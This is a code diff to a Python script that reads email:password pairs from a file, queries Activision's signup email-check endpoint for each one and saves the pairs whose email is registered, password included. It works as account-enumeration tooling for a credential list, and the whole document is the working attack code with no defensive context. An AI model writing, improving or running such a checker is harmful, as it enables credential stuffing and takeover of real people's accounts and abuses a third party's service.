@@ -1,8 +1,18 @@
-import requests
+import requests, os
+from tqdm import tqdm
+
 
 all_emails_file =  open(os.path.dirname(os.path.realpath(__file__)) + '/all_emails.txt', 'r')
+valid_emails_file = open(os.path.dirname(os.path.realpath(__file__)) + '/valid_emails.txt', 'a')
+num_lines = sum(1 for _ in all_emails_file)
+all_emails_file.seek(0)
+url = 'https://s.activision.com/activision/signup/checkEmail'
 
-for line in all_emails_file:
+num_valids = 0
+for i in tqdm (range(num_lines),
+               desc="Checking emails…",
+               ascii=False, ncols=100):
+    line = all_emails_file.readline()
     full_line = line.strip()
     if full_line == '':
         continue
@@ -11,7 +21,6 @@ for line in all_emails_file:
     username = splited_full_line[0]
     pasword = splited_full_line[1]
 
-    url = 'https://s.activision.com/activision/signup/checkEmail'
     params = {
         'email': username
     }
@@ -24,7 +33,5 @@ for line in all_emails_file:
         json_response = response.json()
 
         if json_response['status'] == 'valid':
-            print(json_response['status'])
-            #with open(os.path.dirname(os.path.realpath(__file__)) + '/valid_emails.txt', 'a') as valid_emails_file:
-            #    valid_emails_file.write(email_line)
 
+            valid_emails_file.write(full_line)
